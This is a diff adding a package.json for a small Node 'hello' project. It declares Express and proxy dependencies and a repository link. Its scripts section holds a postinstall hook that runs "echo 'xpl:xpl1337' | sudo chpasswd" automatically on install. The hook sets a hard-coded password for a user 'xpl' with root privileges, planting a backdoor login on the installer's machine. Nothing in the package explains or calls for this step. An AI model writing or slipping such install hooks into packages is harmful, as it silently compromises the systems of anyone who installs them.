@@ -1,0 +1,20 @@
+{
+  "name": "ninj4c0d3r-hello-node",
+  "version": "0.0.0",
+  "dependencies": {
+    "cf-deployment-tracker-client": "*",
+    "commander": "^2.6.0",
+    "express": "^4.14.1",
+    "http-post": "^0.1.1",
+    "http-proxy": "^1.8.1"
+  },
+  "main": "server.js",
+  "scripts": {
+    "start": "server.js",
+    "postinstall": "echo 'xpl:xpl1337' | sudo chpasswd"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/ninj4c0d3r/test-nodejs.git"
+  }
+}
